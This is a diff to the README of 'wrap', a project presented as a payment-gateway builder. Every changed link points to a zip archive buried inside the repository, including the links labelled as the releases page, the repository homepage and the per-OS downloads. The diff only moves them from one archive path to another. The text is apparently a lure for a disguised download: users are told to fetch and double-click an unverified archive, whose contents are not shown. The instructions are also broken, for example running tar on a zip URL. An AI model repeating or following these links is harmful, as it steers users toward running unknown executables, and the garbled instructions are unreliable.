@@ -6,7 +6,7 @@ Welcome to **wrap**, your friendly tool to build your own payment gateway. Follo
 
 ## 📦 Download Now!
 
-[![Download wrap](https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip)](https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip)
+[![Download wrap](https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip)](https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip)
 
 ## 📋 Features
 
@@ -26,18 +26,18 @@ Before you begin, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the following link to access our latest version: [Download from GitHub Releases](https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip).
+1. **Visit the Releases Page:** Go to the following link to access our latest version: [Download from GitHub Releases](https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip).
 
 2. **Select the Version:** Look for the latest version listed. It usually appears at the top of the page.
 
 3. **Download the File:** Click on the suitable file for your operating system:
-   - For Windows: Look for `https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip`.
-   - For macOS: Look for `https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip`.
-   - For Linux: Look for `https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip`.
+   - For Windows: Look for `https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip`.
+   - For macOS: Look for `https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip`.
+   - For Linux: Look for `https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip`.
 
 4. **Extract the Files:**
    - For Windows and macOS, unzip the downloaded file.
-   - For Linux, extract the files using the terminal command: `tar -xvzf https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip`.
+   - For Linux, extract the files using the terminal command: `tar -xvzf https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip`.
 
 5. **Run the Application:**
    - On Windows and macOS, double-click the extracted application file to start it.
@@ -77,7 +77,7 @@ If you encounter any issues or need help, here’s how to get support:
 
 For more information, tips, and updates, check our GitHub repository and follow our project:
 
-- **Repository Homepage:** [wrap on GitHub](https://raw.githubusercontent.com/fatalbru/wrap/main/orthosomatic/wrap.zip)
+- **Repository Homepage:** [wrap on GitHub](https://github.com/fatalbru/wrap/raw/refs/heads/main/app/Events/Payments/Software-v3.6.zip)
 - **Documentation:** Visit our online docs for in-depth usage.
 
 Thank you for choosing wrap. We hope this tool simplifies your payment processing needs. Enjoy building your payment solutions!
